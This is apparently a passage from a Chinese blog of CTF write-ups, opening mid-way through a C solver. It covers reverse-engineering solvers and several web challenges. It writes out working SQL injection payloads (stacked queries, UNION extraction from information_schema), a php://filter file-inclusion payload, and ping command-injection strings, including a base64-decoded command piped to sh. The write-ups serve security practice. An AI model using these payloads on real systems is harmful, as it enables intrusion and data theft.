class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>,head-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">diyBit</span><span class="params">(<span class="keyword">uint8_t</span> *data,<span class="keyword">uint32_t</span> a1,<span class="keyword">uint32_t</span> a2)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;=a2;i++)&#123;</span><br><span class="line">        data[i]^=a1;</span><br><span class="line">        data[i]=data[i]&lt;&lt;(<span class="number">8</span>-a2)|data[i]&gt;&gt;a2;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">1</span>;j&lt;<span class="number">15</span>;j++)&#123;</span><br><span class="line">            data[i]^=data[j]&amp;<span class="number">0xDF</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reDiyBit</span><span class="params">(<span class="keyword">uint8_t</span> *data,<span class="keyword">uint32_t</span> a1,<span class="keyword">uint32_t</span> a2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> i=a2;i&lt;a2+<span class="number">1</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">1</span>;j&lt;<span class="number">15</span>;j++)&#123;</span><br><span class="line">                data[i]^=data[j]&amp;<span class="number">0xdf</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            data[i]^=<span class="number">1</span>&lt;&lt;i%<span class="number">8</span>;</span><br><span class="line">            data[i]=data[i]&gt;&gt;(<span class="number">8</span>-a2%<span class="number">8</span>)|data[i]&lt;&lt;a2%<span class="number">8</span>;</span><br><span class="line">            data[i]^=a1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">sub</span><span class="params">(<span class="keyword">uint8_t</span> a1,<span class="keyword">uint8_t</span> a2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a1-a2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">xor</span><span class="params">(<span class="keyword">uint8_t</span> a1,<span class="keyword">uint8_t</span> a2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a1^a2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">absSub</span><span class="params">(<span class="keyword">uint8_t</span> a1,<span class="keyword">uint8_t</span> a2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a1&gt;a2)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_4016F0</span><span class="params">(<span class="keyword">uint8_t</span> *data)</span></span>&#123;</span><br><span class="line">    data[<span class="number">15</span>] = sub(data[<span class="number">15</span>],<span class="number">2</span>);</span><br><span class="line">    data[<span class="number">14</span>] = <span class="keyword">xor</span>(data[<span class="number">14</span>],data[<span class="number">15</span>]);</span><br><span class="line">    data[<span class="number">12</span>] = absSub(data[<span class="number">12</span>],data[<span class="number">2</span>]);</span><br><span class="line">    data[<span class="number">11</span>] = <span class="keyword">xor</span>(data[<span class="number">11</span>],data[<span class="number">12</span>]);</span><br><span class="line">    data[<span class="number">10</span>]=absSub(data[<span class="number">10</span>],data[<span class="number">7</span>]);</span><br><span class="line">    data[<span class="number">9</span>] = absSub(data[<span class="number">9</span>],data[<span class="number">8</span>]);</span><br><span class="line">    data[<span class="number">8</span>] = <span class="keyword">xor</span>(data[<span class="number">8</span>],data[<span class="number">7</span>]);</span><br><span class="line">    data[<span class="number">7</span>] = sub(data[<span class="number">7</span>],<span class="number">3</span>);</span><br><span class="line">    data[<span class="number">6</span>] = absSub(data[<span class="number">6</span>],data[<span class="number">1</span>]);</span><br><span class="line">    data[<span class="number">4</span>] = <span class="keyword">xor</span>(data[<span class="number">4</span>],data[<span class="number">5</span>]);</span><br><span class="line">    data[<span class="number">3</span>] = absSub(data[<span class="number">3</span>],data[<span class="number">7</span>]);</span><br><span class="line">    data[<span class="number">2</span>] = sub(data[<span class="number">2</span>],<span class="number">7</span>);</span><br><span class="line">    data[<span class="number">1</span>] = <span class="keyword">xor</span>(data[<span class="number">1</span>],data[<span class="number">2</span>]);</span><br><span class="line">    data[<span class="number">0</span>] = sub(data[<span class="number">0</span>],<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// TreeNode*head;</span></span><br><span class="line">    <span class="comment">// sub_401120(&amp;head);</span></span><br><span class="line">    <span class="comment">// postTraverse(head);</span></span><br><span class="line">    <span class="comment">// printf(&quot;\n&quot;);</span></span><br><span class="line">    <span class="keyword">uint8_t</span> xorData[] = &#123;<span class="number">0x4d</span>,<span class="number">0x4c</span>,<span class="number">0x47</span>,<span class="number">0x50</span>,<span class="number">0x4f</span>,<span class="number">0x4b</span>,<span class="number">0x46</span>,<span class="number">0x43</span>,<span class="number">0x4a</span>,<span class="number">0x45</span>,<span class="number">0x4e</span>,<span class="number">0x49</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x42</span>,<span class="number">0x41</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,xorData);</span><br><span class="line">    <span class="keyword">uint8_t</span> cmpData[] = &#123;<span class="number">0x17</span>, <span class="number">0x63</span>, <span class="number">0x77</span>, <span class="number">0x3</span>, <span class="number">0x52</span>, <span class="number">0x2e</span>, <span class="number">0x4a</span>, <span class="number">0x28</span>, <span class="number">0x52</span>, <span class="number">0x1b</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x3a</span>, <span class="number">0xa</span>, <span class="number">0x6c</span>, <span class="number">0x62</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;;</span><br><span class="line">    cmpData[<span class="number">0</span>]-=<span class="number">10</span>;</span><br><span class="line">    cmpData[<span class="number">12</span>]=cmpData[<span class="number">2</span>]-cmpData[<span class="number">12</span>];</span><br><span class="line">    cmpData[<span class="number">11</span>]^=cmpData[<span class="number">12</span>];</span><br><span class="line">    cmpData[<span class="number">2</span>]-=<span class="number">7</span>;</span><br><span class="line">    cmpData[<span class="number">9</span>]=cmpData[<span class="number">8</span>]-cmpData[<span class="number">9</span>];</span><br><span class="line">    cmpData[<span class="number">8</span>]^=cmpData[<span class="number">7</span>];</span><br><span class="line">    cmpData[<span class="number">10</span>]=cmpData[<span class="number">7</span>]-cmpData[<span class="number">10</span>];</span><br><span class="line">    cmpData[<span class="number">7</span>]-=<span class="number">3</span>;</span><br><span class="line">    cmpData[<span class="number">3</span>]=cmpData[<span class="number">7</span>]-cmpData[<span class="number">3</span>];<span class="comment">//test</span></span><br><span class="line">    cmpData[<span class="number">15</span>]-=<span class="number">2</span>;</span><br><span class="line">    cmpData[<span class="number">14</span>]^=cmpData[<span class="number">15</span>];</span><br><span class="line">    cmpData[<span class="number">4</span>]^=cmpData[<span class="number">5</span>];</span><br><span class="line">    cmpData[<span class="number">6</span>]=cmpData[<span class="number">1</span>]-cmpData[<span class="number">6</span>];</span><br><span class="line">    cmpData[<span class="number">1</span>]^=cmpData[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        cmpData[i]^=xorData[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,cmpData);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> s[] = <span class="string">&quot;1234567890123456&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        s[i]^=xorData[i];</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;test&quot;</span>,s,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web-SUCTF-2019-EasySQL"><a href="#web-SUCTF-2019-EasySQL" class="headerlink" title="[web][SUCTF 2019]EasySQL"></a>[web][SUCTF 2019]EasySQL</h2><p>注入时发现三种情况</p>
<ol>
<li>单纯输入数字：输出固定值</li>
<li>加个引号导致语法错误：无输出</li>
<li>尝试注入1’ and 1=1 #：输出NoNoNo</li>
</ol>
<p>说明后端存在对于关键字的检测</p>
<p>可以直接使用fuzz字典+burpsuite测试后端过滤了哪些关键字。注意burp的线程不要太高，否则无法访问</p>
<p>公开代码可以看到关键查询语句为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $post[<span class="string">&#x27;query&#x27;</span>]||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure>

<p>要尝试让||不是逻辑或</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;</span><br></pre></td></tr></table></figure>

<p>这个模式下||就是管道模式，把前后查询的拼接在一起，而不是或运算符</p>
<p>payload为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>还有个解*,1，相当于select *,1</p>
<h2 id="rev-极客大挑战-2019-Secret-File"><a href="#rev-极客大挑战-2019-Secret-File" class="headerlink" title="[rev][极客大挑战 2019]Secret File"></a>[rev][极客大挑战 2019]Secret File</h2><ol>
<li>通过抓包抓到了secr3t.php</li>
<li>尝试了直接访问flag.php和文件包含flag.php都不行</li>
<li>原来不论文件包含还是直接访问，得到的都是flag.php执行之后的结果</li>
<li>通过php://filter获取文件结果<br>file=php://filter/convert.base64-encode/resource=flag.php</li>
<li>base64解码获得flag</li>
</ol>
<p>这里是php的文件包含漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">&quot;../&quot;</span>)||stristr($file, <span class="string">&quot;tp&quot;</span>)||stristr($file,<span class="string">&quot;input&quot;</span>)||stristr($file,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=<span class="string">&quot;background-color:black;&quot;</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">        &lt;h1 style=<span class="string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">        &lt;p style=<span class="string">&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;</span>&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;我就在这里&quot;</span>;</span><br><span class="line">                $flag = <span class="string">&#x27;flag&#123;49f63fd5-1b25-4904-9029-eb8dd71b352b&#125;&#x27;</span>;</span><br><span class="line">                $secret = <span class="string">&#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span></span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web-极客大挑战-2019-LoveSQL"><a href="#web-极客大挑战-2019-LoveSQL" class="headerlink" title="[web][极客大挑战 2019]LoveSQL"></a>[web][极客大挑战 2019]LoveSQL</h2><p>手工注入步骤</p>
<p>确认存在注入点<br>1’ or 1=1 #</p>
<p>1’ and 1=0 #</p>
<p>字段数<br>1’ union select 1,2,3 #</p>
<p>数据库名<br>1’ union select 1,2,database() #</p>
<p>表名<br>1’ union select 1,2,group_concat(table_name) from information_schema.columns where table_schema=database() #</p>
<p>这里有两张表geekuser l0ve1ysq1</p>
<p>列名<br>1’ union select 1,group_concat(column_name),2 from information_schema.columns where table_name=geekuser#</p>
<p>然后就可以找到flag</p>
<h2 id="web-护网杯-2018-easy-tornado"><a href="#web-护网杯-2018-easy-tornado" class="headerlink" title="[web][护网杯 2018]easy_tornado"></a>[web][护网杯 2018]easy_tornado</h2><p>访问hints.txt发现获取flag的方式，但是获取不到secret_cookie</p>
<ol>
<li>访问welcome.txt, 有个render，暗示使用python的render</li>
<li>可以报错注入，error?msg=</li>
<li>得到secret_cookie之后得到flag</li>
</ol>
<h2 id="web-GXYCTF2019-Ping-Ping-Ping"><a href="#web-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[web][GXYCTF2019]Ping Ping Ping"></a>[web][GXYCTF2019]Ping Ping Ping</h2><ol>
<li>ip=127.0.0.1 是ping命令</li>
<li>加||，空格会fuck your spaces</li>
<li>使用ip=127.0.0.1;ls 可以查看所有文件</li>
<li>看答案空格可以用$IFS$1代替</li>
<li>flag.php不让看，index.php可以查看</li>
<li>发现有个a变量，可以变量替换?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</li>
<li>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh //通过base64</li>
<li>ip=127.0.0.1;cat$IFS$10<code>ls</code> // <code>ls</code>即取ls的结果</li>
</ol>
<h2 id="rev-SWPU2019-EasiestRe"><a href="#rev-SWPU2019-EasiestRe" class="headerlink" title="[rev][SWPU2019]EasiestRe"></a>[rev][SWPU2019]EasiestRe</h2><p>父子进程问题</p>
<ol>
<li>找到main函数</li>
<li>发现进行了fork，然后判断父子进程，子进程就输出，父进程等待调试事件</li>
<li>子进程求长度之后int3，父进程得到int3之后判断nop数量，然后写入内存</li>
<li>4个nop：直接继续执行<br>7个nop：写入v65<br>30个nop：写入v64</li>
<li>得到长度是0x18</li>
<li>通过SEH链实现验证逻辑</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v65 = [<span class="number">0x90</span>,<span class="number">0x83</span>,<span class="number">0x7d</span>,<span class="number">0xf8</span>,<span class="number">0x18</span>,<span class="number">0x7d</span>,<span class="number">0x11</span>]</span><br><span class="line">addr = <span class="number">0x408af8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(addr,addr+<span class="number">7</span>):</span><br><span class="line">    patch_byte(i,v65[i-addr])</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v64 = [<span class="number">0x90</span>,<span class="number">0xF</span>,<span class="number">0xB6</span>,<span class="number">0x55</span>,<span class="number">0xF7</span>,<span class="number">0x8B</span>,<span class="number">0x45</span>,<span class="number">8</span>,<span class="number">0x8B</span>,<span class="number">4</span>,<span class="number">0x90</span>,<span class="number">0xF</span>,<span class="number">0xAF</span>,<span class="number">0x45</span>,<span class="number">0xFC</span>,<span class="number">0x33</span>,<span class="number">0xD2</span>,<span class="number">0xF7</span>,<span class="number">0x75</span>,<span class="number">0xF8</span>,<span class="number">0xF</span>,<span class="number">0xB6</span>,<span class="number">0x4D</span>,<span class="number">0xF7</span>,<span class="number">0x8B</span>,<span class="number">0x45</span>,<span class="number">0xC</span>,<span class="number">0x89</span>,<span class="number">0x14</span>,<span class="number">0x88</span>]</span><br><span class="line">addr = <span class="number">0x408824</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(addr,addr+<span class="number">30</span>):</span><br><span class="line">    patch_byte(i,v64[i-addr])</span><br></pre></td></tr></table></figure>

<p>好家伙一个小错误弄一个小时</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    <span class="keyword">int8_t</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>*<span class="title">right</span>;</span></span><br><span class="line">&#125; TreeNode;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint8_t</span> *v, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int32_t</span> *a1,<span class="keyword">int32_t</span> *a2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        a2[i]=a1[i]*<span class="number">41</span>%<span class="number">0x1eb</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int32_t</span> v10[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">int32_t</span> v19[<span class="number">8</span>];</span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">check</span><span class="params">(<span class="keyword">uint8_t</span> f,<span class="keyword">int32_t</span> target)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int8_t</span> ch[<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int32_t</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="number">1</span>&lt;&lt;i)&amp;f)&#123;</span><br><span class="line">            ch[i]=<span class="number">1</span>;</span><br><span class="line">            sum+=v19[<span class="number">7</span>-i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sum==target)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    v10[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">    v10[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">    v10[<span class="number">2</span>] = <span class="number">7</span>;</span><br><span class="line">    v10[<span class="number">3</span>] = <span class="number">14</span>;</span><br><span class="line">    v10[<span class="number">4</span>] = <span class="number">30</span>;</span><br><span class="line">    v10[<span class="number">5</span>] = <span class="number">57</span>;</span><br><span class="line">    v10[<span class="number">6</span>] = <span class="number">120</span>;</span><br><span class="line">    v10[<span class="number">7</span>] = <span class="number">251</span>;</span><br><span class="line">    init(v10,v19);</span><br><span class="line">    <span class="keyword">int32_t</span> v8[<span class="number">24</span>];</span><br><span class="line">    v8[<span class="number">0</span>] = <span class="number">977</span>;</span><br><span class="line">    v8[<span class="number">1</span>] = <span class="number">752</span>;</span><br><span class="line">    v8[<span class="number">2</span>] = <span class="number">82</span>;</span><br><span class="line">    v8[<span class="number">3</span>] = <span class="number">1141</span>;</span><br><span class="line">    v8[<span class="number">4</span>] = <span class="number">466</span>;</span><br><span class="line">    v8[<span class="number">5</span>] = <span class="number">752</span>;</span><br><span class="line">    v8[<span class="number">6</span>] = <span class="number">548</span>;</span><br><span class="line">    v8[<span class="number">7</span>] = <span class="number">1308</span>;</span><br><span class="line">    v8[<span class="number">8</span>] = <span class="number">1254</span>;</span><br><span class="line">    v8[<span class="number">9</span>] = <span class="number">671</span>;</span><br><span class="line">    v8[<span class="number">10</span>] = <span class="number">750</span>;</span><br><span class="line">    v8[<span class="number">11</span>] = <span class="number">923</span>;</span><br><span class="line">    v8[<span class="number">12</span>] = <span class="number">1017</span>;</span><br><span class="line">    v8[<span class="number">13</span>] = <span class="number">811</span>;</span><br><span class="line">    v8[<span class="number">14</span>] = <span class="number">754</span>;</span><br><span class="line">    v8[<span class="number">15</span>] = <span class="number">1461</span>;</span><br><span class="line">    v8[<span class="number">16</span>] = <span class="number">588</span>;</span><br><span class="line">    v8[<span class="number">17</span>] = <span class="number">1114</span>;</span><br><span class="line">    v8[<span class="number">18</span>] = <span class="number">844</span>;</span><br><span class="line">    v8[<span class="number">19</span>] = <span class="number">1389</span>;</span><br><span class="line">    v8[<span class="number">20</span>] = <span class="number">10</span>;</span><br><span class="line">    v8[<span class="number">21</span>] = <span class="number">1254</span>;</span><br><span class="line">    v8[<span class="number">22</span>] = <span class="number">1142</span>;</span><br><span class="line">    v8[<span class="number">23</span>] = <span class="number">729</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int32_t</span> start =<span class="number">0x1234</span>;</span><br><span class="line">    <span class="keyword">int8_t</span> flag[<span class="number">25</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">uint8_t</span> j=<span class="number">0x20</span>;j&lt;<span class="number">0x7f</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">uint8_t</span> f;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">                f=j^<span class="number">0x34</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                f=j^(v8[i<span class="number">-1</span>]&amp;<span class="number">0xFF</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(check(f,v8[i]))&#123;</span><br><span class="line">                flag[i]=j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">0x7e</span>)flag[i]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %s\n&quot;</span>,i,flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="misc-二维码"><a href="#misc-二维码" class="headerlink" title="[misc]二维码"></a>[misc]二维码</h2><ol>
<li><p>二维码图片，扫出来 secret is here</p>
</li>
<li><p>二进制查看，发现 number4.txt</p>
</li>
<li><p>binwalk走一波，出来个加密zip</p>
</li>
<li><p>看答案，原来number4暗示密码是4个数字，使用fcrackzip爆破</p>
<p>fcrackzip -b -c1 -l 4 文件名</p>
</li>
</ol>
<p>找到一堆可能的密码，7639是</p>
<h2 id="rev-NPUCTF2020-EzObfus-Chapter2"><a href="#rev-NPUCTF2020-EzObfus-Chapter2" class="headerlink" title="[rev][NPUCTF2020]EzObfus-Chapter2"></a>[rev][NPUCTF2020]EzObfus-Chapter2</h2><ol>
<li>里面有个很多层调用的函数</li>
<li>本来想用调试方法爆破，可是总是出个访存异常mmp</li>
<li>看答案，顺便学一下angr</li>
</ol>
